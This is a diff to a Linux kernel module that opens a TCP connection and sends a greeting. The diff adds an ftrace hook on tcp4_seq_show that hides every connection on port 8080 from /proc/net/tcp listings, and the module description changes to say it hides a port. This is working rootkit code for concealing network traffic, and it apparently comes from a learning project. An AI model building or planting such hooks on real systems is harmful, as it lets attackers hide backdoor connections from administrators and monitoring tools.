@@ -6,11 +6,15 @@
 #include <linux/in.h>
 #include <linux/tcp.h>
 #include <linux/slab.h>
+#include <linux/syscalls.h>
+#include <linux/kallsyms.h>
 #include <net/sock.h>
 
+#include "ftrace_helper.h"
+
 MODULE_AUTHOR("Euler Neto");
-MODULE_DESCRIPTION("Hello world with socket");
-MODULE_LICENSE("Dual MIT/GPL");
+MODULE_DESCRIPTION("Hello world with socket and hook to hide port");
+MODULE_LICENSE("GPL");
 MODULE_VERSION("0.1");
 
 struct sockaddr_in serveraddr;
@@ -55,6 +59,30 @@ int tcp_client_send(struct socket *sock, const char *buf,
 	return len;
 }
 
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v){
+	struct inet_sock *is;
+	long ret;
+	unsigned short port = htons(8080);
+
+	if (v != SEQ_START_TOKEN){
+		is = (struct inet_sock *)v;
+		if (port == is->inet_sport || port == is->inet_dport){
+			printk(KERN_INFO "Hooking sport %d and dport %d", 
+					ntohs(is->inet_sport), ntohs(is->inet_dport));
+			return 0;
+		}
+	}
+
+	ret = orig_tcp4_seq_show(seq, v);
+	return ret;
+}
+
+static struct ftrace_hook hooks[] = {
+	HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
+};
+
 static int __init helloworld_lkm_init(void)
 {
 	int r = -1;
@@ -77,17 +105,20 @@ static int __init helloworld_lkm_init(void)
 		memset(&msg_to_send, 0, 20);
 		strcat(msg_to_send, "HOWDY HO!");
 		tcp_client_send(control, msg_to_send, 20, MSG_DONTWAIT);
+
+		int port_hide = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
 	}
 	else{
 		printk(KERN_INFO "Connection failed\n");
 	}
 
 	printk(KERN_INFO "Hello, world\n");
-	return 0;		/* success */
+	return 0;
 }
 
 static void __exit helloworld_lkm_exit(void)
 {
+	fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
 	printk(KERN_INFO "Goodbye, world\n");
 }
 
